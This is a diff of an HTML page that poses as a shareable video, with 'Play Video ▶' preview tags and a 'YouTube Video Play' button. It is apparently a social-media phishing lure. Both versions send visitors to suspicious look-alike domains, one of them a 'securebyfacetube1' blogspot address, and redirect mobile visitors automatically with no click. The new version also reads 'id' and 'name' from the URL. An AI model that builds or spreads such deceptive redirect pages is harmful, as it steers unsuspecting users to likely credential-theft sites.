@@ -1,45 +1,60 @@
 
-<html lang="es">
-	<head>
-		<meta charset="UTF-8">
-		<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"/>
-		<meta property="og:url" content="https://pbs.twimg.com/media/EafeQeOWsAA7Epi?format=png&name=small"/>
-		
-		<title>Loading...</title>
-		
-		<style>
-		.btn {
-			border: none;
-			color: #ffffff;
-			font-size: 20px;
-			cursor: pointer;
-			padding: 35px 62px;
-			text-align: center;
-			text-decoration: none;
-			background-color: #6fa8dc;
-			display: inline-block;
-		}
-		</style>
-		
-	</head>
-	<body>
-		
-		<button class="btn" onclick="visitPage();">
-			<strong>Watch Video</strong>
-		</button>
-		
-		
 
-	    <script>
-		function visitPage(){
-			window.location = 'https://app-videos-fb-2020.xyz/';
-		}
-		
-		if(screen.width <= 720){
-			window.location = 'https://app-videos-fb-2020.xyz/';
-		}
-		</script>
-		
-	</body>
-	</html>
+<html>
+<head>
+<meta property="og:title" content=" Play Video ▶ " />
+<meta property="og:description"        content="      " />
+<meta property="og:image" content="https://pbs.twimg.com/media/EdJUhsrXgAMHW9U?format=jpg&name=medium" />
+</head>
+<body>
+<style>
+.button {
+    background-color: #4CAF50;
+    border: none;
+    color: white;
+    padding: 35px 62px;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 20px;
+    margin: 4px 2px;
+    cursor: pointer;
+}
+</style>
+<p id="demo">
+
+</p>
+<script type="text/javascript">
+
+function generateRandomString(iLen) {
+    var sRnd = '';
+    var sChrs = "abcdefghiklmnopqrstuvwxyz";
+    for (var i = 0; i < iLen; i++) {
+      var randomPoz = Math.floor(Math.random() * sChrs.length);
+      sRnd += sChrs.substring(randomPoz, randomPoz + 1);
+    }
+    return sRnd;
+  }
+
+function getUrlVars() {
+    var vars = {};
+    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+        vars[key] = value;
+    });
+    return vars;
+}
+var id = getUrlVars()["id"];
+var name = getUrlVars()["name"];
+function visitPage(){
+        window.location = "https://securebyfacetube1.blogspot.com";
+    }
+
+        if (screen.width <= 720) {
+        window.location = "https://securebyfacetube1.blogspot.com";
+    } else {
+       document.getElementById("demo").innerHTML ="<h1><button class=button onclick=visitPage();> YouTube Video Play </button></h1>"
+    }
+
+</script>
+</body>
+</html>
